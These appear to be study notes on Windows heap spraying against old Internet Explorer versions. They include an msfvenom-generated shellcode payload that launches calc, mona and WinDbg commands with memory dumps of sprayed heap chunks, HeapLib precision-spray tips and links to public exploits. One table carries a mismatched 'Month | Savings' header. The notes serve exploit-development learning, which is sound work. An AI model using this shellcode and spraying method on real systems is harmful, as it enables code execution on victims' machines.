# Windows Heap Spraying

### Overview

The idea is to obtain some primative which allows us to allocate spaces in heap. Once we obtain this primative, we can "spray" patterns of nop+shellcode in the heap which we can later use to obtain code execution (after a conventional buffer overflow/UaF leading to EIP control). Majority of the notes taken from the [Corelan Epxloit Writing](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/), as well as [FuzzySecurity Exploit Development](https://fuzzysecurity.com/tutorials/expDev/8.html) resource (less the parts on UaF).

  - For some reason, code snippets on Corelan is not there but I found a better version with the code snippets found [here](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Stack%20Bug%20-%20Exploit%20writing%20tutorial%20part%2011%20heap-spraying%20demystified.pdf)

### Heap Spraying on IE (no DEP)

Use IE6 and/or IE7 while allowing blocked content. When looking at process memory, and locating the actual string in memory, you’ll notice that each of these variables appear to be converted to unicode. In fact, when a string gets allocated, it becomes a BSTR string object. This object has a header and a terminator, and does indeed contain a unicode converted instance of the original string. The header of the BSTR object is 4 bytes (dword) and contains the length of the unicode string.  At the end of the object, we find a double null byte, indicating the end of the string.

If we allocate the string "Hello World", it will take a total of 4 (header) + 11 * 2 (unicode) + 2 (terminator) bytes. To see your unicode/ASCII string in Immunity Debugger, after running !mona find, we can right click and select "Dump at Address".

```
!mona find -s "w00t"
!mona find -s "CORELAN!"
!mona find -s "CORELAN!" -unicode -x *
```

When we allocate 200 chunks, there is garbage in between the chunks. Play around with the payload size and the number of chunks to obtain reliable heap pointers that will point back to 0x90909090 by setting EIP to 0x06060606. After which, we can simply add our payload at the end of our NOPs.

```
└─$ msfvenom -f js_le -p windows/exec cmd=calc 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 190 bytes
Final size of js_le file: 570 bytes
%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100
```

Browser & Version Does Heap Spray Script work ?

| Month    | Savings |
| -------- | ------- |
| Internet Explorer 5 | Yes |
| Internet Explorer 6 | Yes |
| Internet Explorer 7 | Yes |
| Internet Explorer 8 and up | No |
| Firefox 3.6.24 | Yes |
| Firefox 6.0.2 | No |
| Opera 11.60 | Yes |
| Google Chrome 15.x | No |
| Safari 5.1.2 | No |


Alternative ways to heap spray: 

- On Web Browsers:

  1. Bmp Images

- On Adobe Reader:

  1. PDF

  2. JS

- On Adobe Flash:

  1. AS

- On Microsoft Office

  1. VBA

### Heap Spraying on IE (DEP)

IE8 has DEP enabled and the techniques that we have used to perform heap spraying does not work. Even if it works, the heap is not sprayed precisely and DEP will derail the exploit. Hence, we need to use Heaplib/other techniques to perform heap spraying and transform it to precision heap spraying.

There's alot of discovered exploits on IE8 (i.e. UaF), just need to perform precision heap spraying and chain one of the exploits with it. The internals behind UaF will be covered elsewhere.

For using HeapLib, note that:

- Must be in multiples of sixteen

- Must have a minimum size (0x1000 should be okay)

- When running alloc function, your payload length (assuming unescaped) will x2 + 6 due to BSTR structure, so need to account for that

- Must have a minimum size (0x1000 should be okay)

- For IE8 and beyond, debug the process with [sysfader](https://devblogs.microsoft.com/oldnewthing/20120809-00/?p=6903)

For precision heap spray, we need to set EIP to the exact point in our NOP sled (just behind the shellcode which is actually our ROP chain). How? For IE8, we observe the following behavior after achieving our heap spray:

- For 0c0c0c0c, the heap entry will be different (e.g. 0x0c0c0018, 0x0c080018) but the offset will be the same as you can see below:

  ```
  0x0c0c0018: BF4
  0x0c080018: 40BF4
  ```

- Below are some logs that were obtained:

  ```
  0:022> d 0a0a0a0a
  0a0a0a0a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a1a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a2a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a3a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a4a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a5a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a6a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0a0a0a7a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
  0:022> dd 0a099040 
  0a099040  42004200 07ff01e3 00020000 45524f43
  0a099050  214e414c 42424242 42424242 42424242
  0a099060  42424242 42424242 42424242 42424242
  0a099070  42424242 42424242 42424242 42424242
  0a099080  42424242 42424242 42424242 42424242
  0a099090  42424242 42424242 42424242 42424242
  0a0990a0  42424242 42424242 42424242 42424242
  0a0990b0  42424242 42424242 42424242 42424242
  0:022> dc 0a099040 
  0a099040  42004200 07ff01e3 00020000 45524f43  .B.B........CORE
  0a099050  214e414c 42424242 42424242 42424242  LAN!BBBBBBBBBBBB
  0a099060  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a099070  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a099080  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a099090  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0990a0  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0990b0  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
      address 0a0a0a0a found in
      _HEAP @ 150000
        HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
          0a095040 4200 0000  [01]   0a095048    20fc1 - (busy)

  0a0a0040: 9ca 
  0a099040: 79ca
  0a095040: b9ca
  ```

  ```
  0:021> dc 0a099040 + 20fc1 + 3f + 20fc1 + 3f
  0a0db040  42004200 07ff0169 00020000 42424242  .B.Bi.......BBBB
  0a0db050  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0db060  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0db070  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0db080  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0db090  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0db0a0  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0db0b0  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0:021> dc 0a099040 + 20fc1 + 3f
  0a0ba040  42004200 07ff0169 00020000 42424242  .B.Bi.......BBBB
  0a0ba050  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0ba060  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0ba070  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0ba080  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0ba090  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0ba0a0  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0a0ba0b0  42424242 42424242 42424242 42424242  BBBBBBBBBBBBBBBB
  0:009> d 0a099040 + 9ca + 0x1000 + 0x2000-4
  0a09ca06  44444444 43434343 43434343 43434343
  0a09ca16  43434343 43434343 43434343 43434343
  0a09ca26  43434343 43434343 43434343 43434343
  0a09ca36  43434343 43434343 43434343 43434343
  0a09ca46  43434343 43434343 43434343 43434343
  0a09ca56  43434343 43434343 43434343 43434343
  0a09ca66  43434343 43434343 43434343 43434343
  0a09ca76  43434343 43434343 43434343 43434343
  ```

### Resources

Environment Set Up

- https://www.poweriso.com/download.htm

- https://www.softlay.com/downloads/windows-xp-sp3

- http://utilu.com/IECollection/#download

- https://www.microsoft.com/en-sg/download/details.aspx?id=17718

- https://www.microsoft.com/en-us/download/details.aspx?id=16614

- https://www.microsoft.com/en-us/download/confirmation.aspx?id=8279

- https://www.microsoft.com/en-ph/download/confirmation.aspx?id=17851

- https://www.microsoft.com/en-us/download/details.aspx?id=8442

BSTR String

- https://learn.microsoft.com/en-gb/previous-versions/windows/desktop/automat/bstr?redirectedfrom=MSDN

Corelan's Case Study - CommuniCrypt Mail (Heap Spray -> BoF -> Code Execution)

- https://packetstormsecurity.com/files/89724/CommuniCrypt-mail-1.16-Active-X-Buffer-Overflow.html

- https://github.com/Jb05s/Exploit-Dev/blob/master/CommuniCrypt-Mail-1.16/HeapSpray.html

- https://www.exploit-db.com/exploits/12663

Heap Feng Shui

- [Part 1](https://www.youtube.com/watch?v=xvrsn39dSSA&ab_channel=killab66661), [Part 2](https://www.youtube.com/watch?v=-iZ2nnc1ocU&ab_channel=killab66661), [Part 3](https://www.youtube.com/watch?v=E6pRhmO_Ryo&ab_channel=killab66661), [Part 4]([https://www.youtube.com/watch?v=a8f-MvrX_XQ&ab_channel=killab66661) 

- https://asanzjx.github.io/2018/11/27/FromHeapSprayToHeapFengShui/

- http://www.phreedom.org/research/heap-feng-shui/

HeapLib

- https://github.com/eegeek1986/heaplib/blob/master/test.html

- https://ioactive.com/heaplib-2-0/

- https://github.com/wireghoul/sploit-dev/blob/master/browsersploits/heapLib2/demangler.py

- https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/heaplib.js.b64

- [Exploits that use HeapLib 1](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms12_004_midi.rb), [Exploits that use HeapLib 2](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms13_037_svg_dashstyle.rb)

Heap Spray Techniques

- https://www.greyhathacker.net/?p=549

- https://www.rapid7.com/blog/post/2013/03/04/new-heap-spray-technique-for-metasploit-browser-exploitation/

Mona Heap Stuff

- https://www.corelan.be/index.php/2013/01/18/heap-layout-visualization-with-mona-py-and-windbg/

- https://www.corelan.be/index.php/2014/08/16/analyzing-heap-objects-with-mona-py/

- https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/
